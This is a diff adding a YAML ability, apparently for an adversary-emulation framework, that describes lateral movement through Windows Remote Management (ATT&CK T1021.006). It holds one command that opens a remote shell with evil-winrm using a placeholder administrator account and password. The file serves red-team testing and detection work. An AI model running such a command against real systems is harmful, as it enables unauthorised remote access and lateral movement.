@@ -1,0 +1,17 @@
+- description: An adversary may attempt to use Evil-WinRM with a valid account to
+    interact with remote systems that have WinRM enabled
+  id: dce08779-676c-01d9-8885-e164a1176ac8
+  name: WinRM Access with Evil-WinRM
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.006
+    name: 'Remote Services: Windows Remote Management'
